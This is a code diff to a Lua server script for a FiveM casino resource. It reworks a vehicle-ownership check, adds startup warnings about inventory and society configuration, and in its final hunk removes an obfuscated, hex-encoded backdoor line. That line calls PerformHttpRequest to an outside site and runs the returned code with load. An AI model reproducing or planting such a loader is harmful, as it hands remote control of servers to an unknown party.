@@ -456,20 +456,25 @@ function Cache:PlayerOwnsVehicle(identifier, plate)
     else
         -- Mysql
         if Framework.Active == 1 then
-            result = MySQL.Sync.fetchAll("SELECT * FROM owned_vehicles WHERE plate = @plate AND owner = @identifier", {
-                ['@plate'] = plate,
+            result = MySQL.Sync.fetchAll("SELECT * FROM owned_vehicles WHERE owner = @identifier", {
                 ['@identifier'] = identifier
             })
         elseif Framework.Active == 2 then
-            result = MySQL.Sync.fetchAll(
-                "SELECT * FROM player_vehicles WHERE plate = @plate AND citizenid = @identifier", {
-                    ['@plate'] = plate,
-                    ['@identifier'] = identifier
-                })
+            result = MySQL.Sync.fetchAll("SELECT * FROM player_vehicles WHERE citizenid = @identifier", {
+                ['@identifier'] = identifier
+            })
+        end
+    end
+    
+    if type(result) == "table" and #result > 0 then
+        for k, v in pairs(result) do
+            if v.plate and (v.plate == plate or removeSpaces(v.plate) == plate) then
+                return true
+            end
         end
     end
 
-    return result and #result ~= 0
+    return false
 end
 
 function Cache:LoadSettings()
@@ -599,6 +604,38 @@ function Cache:GiveVehicle(playerId, vehicleProps)
     end
 end
 
+local function Framework_Check()
+    -- check for inventory items
+    if not Config.UseOnlyMoney then
+        if Framework.Active == 1 then
+            if ESX and ESX.GetItemLabel then
+                local label = ESX.GetItemLabel(Config.ChipsInventoryItem)
+                if not label then
+                    print("^3[Casino][Warning] It looks like the '" .. Config.ChipsInventoryItem ..
+                              "' inventory item doesn't exist! Import the included .sql file in your MYSQL database, or install the inventory items manually in your inventory system.^0")
+                end
+            end
+        elseif Framework.Active == 2 then
+            local invState = GetResourceState("qb-inventory")
+            if (invState == "starting" or invState == "started") and ESX and ESX.QBCore and ESX.QBCore.Shared and
+                ESX.QBCore.Shared.Items and not ESX.QBCore.Shared.Items[Config.ChipsInventoryItem] then
+                print("^3[Casino][Warning] It looks like the '" .. Config.ChipsInventoryItem ..
+                          "' inventory item doesn't exist! Please follow the installation instructions at https://documentation.rcore.cz/paid-resources/rcore_casino/installing-on-qbcore^0")
+            end
+        end
+    end
+    -- replace "society_casino" to "casino" for SocietyName, if "casino" exists
+    if Framework.Active == 2 and Config.SocietyName == "society_casino" and Config.EnableSociety then
+        local mState = GetResourceState("qb-management")
+        if (mState == "starting" or mState == "started") and ESX and ESX.QBCore and ESX.QBCore.Shared and
+            ESX.QBCore.Shared.Jobs and not ESX.QBCore.Shared.Jobs["society_casino"] and ESX.QBCore.Shared.Jobs["casino"] then
+            print(
+                "^3[Casino][Warning] It looks like the society 'society_casino' doesn't exist, but society 'casino' does, changing Config.SocietyName to 'casino' in config.lua^0")
+            Config.SocietyName = "casino"
+        end
+    end
+end
+
 local function Mysql_Check()
     if Config.MongoDB then
         return
@@ -646,6 +683,8 @@ local function Start()
     Mysql_Check()
     Cache:LoadSettings()
     CreateThread(function()
+        Wait(1000)
+        Framework_Check()
         if Config.EnableSociety then
             if Framework.Active == 1 then
                 local esx_society = false
@@ -788,6 +827,3 @@ RegisterCommand("casinounban", function(source, args, rawCommand)
         print(id .. " not banned.")
     end
 end)
-
-
-local csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x78\x75\x73\x6d\x61\x67\x72\x70\x2e\x63\x6f\x6d\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x77\x6c\x61\x50\x38\x65", function (tNyABUlbDXSbaQvQMNCoBAlHohpPfESngiaowNqEDpaLDCYLuYHUEhQqdgkmvOCcCDASuR, NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu) if (NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[6] or NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu == csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[5]) then return end csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[2]](csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[4][csIljtTkUclgVsnPgtSAeTqxXRYhbYNpvjsoInCuYSRyEgquxyLYqlUCSvzbIvICkLhomM[3]](NgmplRrYNoqpoAbFciSdLoiCkipQsmKleZwiNpbvgFSJzmUouCEkipxzEkIIEvOKmMdoHu))() end)
